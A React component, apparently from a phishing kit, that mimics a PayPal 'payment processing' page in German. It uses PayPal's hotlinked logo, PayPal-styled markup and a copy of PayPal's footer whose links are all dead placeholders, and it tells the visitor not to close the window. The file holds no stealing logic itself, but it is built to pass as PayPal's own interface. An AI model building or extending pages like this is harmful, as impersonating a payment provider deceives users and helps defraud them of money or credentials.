import '../styles/PayPalStyle.css';

interface PendingProps {
  message?: string;
}

function Pending({ message = 'Zahlung ausstehend, schließen Sie dieses Fenster nicht!' }: PendingProps) {
  return (
    <div className="paypal-container">
      <div className="paypal-form-container">
        <div className="paypal-logo-container">
          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="PayPal Logo" className="paypal-logo-img" />
        </div>
        
        <form className="paypal-form">
          <h1 className="paypal-form-title">
            Zahlung wird bearbeitet
          </h1>
          
          <div style={{ margin: '40px 0', textAlign: 'center' }}>
            <div className="loading-spinner"></div>
            <p className="pending-message">{message}</p>
          </div>
        </form>
      </div>
      
      <div className="paypal-footer">
        <a href="#">Kontakt</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Impressum</a>
        <a href="#">Weltweit</a>
      </div>
      
      <style>
        {`
          .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0070ba;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto 20px;
          }
          
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          
          .pending-message {
            color: #666;
            font-size: 14px;
          }
        `}
      </style>
    </div>
  );
}

export default Pending;
